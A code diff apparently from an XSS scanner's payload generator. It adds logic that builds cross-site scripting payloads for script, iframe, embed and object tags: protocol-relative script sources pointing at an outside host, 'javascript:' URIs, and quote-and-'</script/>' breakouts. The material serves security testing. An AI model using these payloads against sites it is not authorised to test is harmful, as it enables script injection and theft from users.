@@ -24,8 +24,9 @@ def generator(occurences, response):
                     vectors[10].add(payload)
         elif context == 'attribute':
             found = False
-            quote = occurences[i]['details']['quote']
+            tag = occurences[i]['details']['tag']
             Type = occurences[i]['details']['type']
+            quote = occurences[i]['details']['quote']
             attributeName = occurences[i]['details']['name']
             attributeValue = occurences[i]['details']['value']
             quoteEfficiency = occurences[i]['score'][quote] if quote in occurences[i]['score'] else 100
@@ -97,7 +98,22 @@ def generator(occurences, response):
                                     vectors[7].add(vector)
                                 else:
                                     vectors[9].add(vector)
-
+                elif tag in ('script', 'iframe', 'embed', 'object'):
+                    if attributeName in ('src', 'iframe', 'embed') and attributeValue == xsschecker:
+                        payloads = ['//15.rs', '\\/\\\\\\/\\15.rs']
+                        for payload in payloads:
+                            vectors[10].add(payload)
+                    elif tag == 'object' and attributeName == 'data' and attributeValue == xsschecker:
+                        for function in functions:
+                            found = True
+                            vectors[10].add(r('javascript:') + function)
+                    elif quoteEfficiency == greatBracketEfficiency == 100:
+                        payloads = genGen(fillings, eFillings, lFillings,
+                                          eventHandlers, tags, functions, ends)
+                        for payload in payloads:
+                            payload = quote + '>' + r('</script/>') + payload
+                            found = True
+                            vectors[11].add(payload)
         elif context == 'comment':
             lessBracketEfficiency = occurences[i]['score']['<']
             greatBracketEfficiency = occurences[i]['score']['>']
